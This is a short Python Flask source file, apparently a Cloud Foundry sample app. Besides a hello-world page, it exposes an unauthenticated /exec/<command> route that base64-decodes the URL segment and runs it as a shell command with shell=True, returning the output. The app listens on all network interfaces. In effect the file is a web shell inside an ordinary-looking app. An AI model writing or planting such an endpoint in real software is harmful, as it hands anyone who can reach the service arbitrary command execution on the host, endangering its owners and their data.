"""
Python Flask app

Author: Toby Wilkins
License: See LICENSE.txt

"""
from flask import Flask
import os
import subprocess
import urllib
import base64

app = Flask(__name__)

# Get port from environment variable or choose 9099 as local default
port = int(os.getenv("PORT", 9099))

@app.route('/')
def hello_world():
    return 'Hello World! I am instance ' + str(os.getenv("CF_INSTANCE_INDEX", 0))


@app.route('/exec/<command>')
def execute(command):

    cmd = base64.b64decode(command)

    print "Runing %s" %cmd

    p = subprocess.Popen(cmd, \
        stdout=subprocess.PIPE, \
        stderr=subprocess.PIPE, \
        stdin=subprocess.PIPE, \
        shell = True)

    out, err = p.communicate()

    print "stdout result: %s" % out
    print "stderr result: %s" % err

    if out:
        return out
    else:
        return err


if __name__ == '__main__':
    # Run the app, listening on all IPs with our chosen port number
    app.run(host='0.0.0.0', port=port)
